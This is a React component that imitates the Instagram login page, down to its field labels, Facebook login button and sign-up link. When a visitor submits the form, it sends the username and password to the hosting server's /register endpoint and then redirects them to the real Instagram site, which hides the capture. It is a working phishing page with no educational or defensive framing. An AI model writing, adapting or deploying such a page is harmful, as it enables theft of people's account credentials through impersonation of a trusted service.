import { useRef, useState } from "react"
import "./App.css"
import axios from "axios"
function App() {
  const usernameRef = useRef()
  const passwordRef = useRef()
  const [error, setError] = useState("")
  const [path] = useState(window.location)
  const handleSubmit = async (e) => {
    e.preventDefault()
    setError("")
    await axios
      .post(`${path}register`, {
        username: usernameRef.current.value,
        password: passwordRef.current.value,
      })
      .then((res) => {
        if (res.status == 404) {
          return setError("Something went wrong")
        }
      })
      .catch(() => setError("Something went wrong"))
      if(error=="") window.location="https://instagram.com"
  }

  return (
    <>
      <div className="container">
        {error && <div>{error}</div>}
        <div className="box">
          <div className="heading"></div>
          <form className="login-form" onSubmit={handleSubmit}>
            <div className="field">
              <input
                id="username"
                type="name"
                ref={usernameRef}
                placeholder="Phone number, username, or email"
              />
              <label htmlFor="username">Phone number, username, or email</label>
            </div>
            <div className="field">
              <input
                id="password"
                type="password"
                ref={passwordRef}
                placeholder="password"
              />
              <label htmlFor="password">Password</label>
            </div>
            <button className="login-button" title="login">
              Log In
            </button>
            <div className="separator">
              <div className="line"></div>
              <p>OR</p>
              <div className="line"></div>
            </div>
            <div className="other">
              <button className="fb-login-btn" type="button">
                <i className="fa fa-facebook-official fb-icon"></i>
                <span className="">Log in with Facebook</span>
              </button>
              <a className="htmlForgot-password" href="#">
                Forgot password?
              </a>
            </div>
          </form>
        </div>
        <div className="box">
          <p>
            Don't have an account?{" "}
            <a className="signup" href="#">
              Sign Up
            </a>
          </p>
        </div>
      </div>
    </>
  )
}

export default App
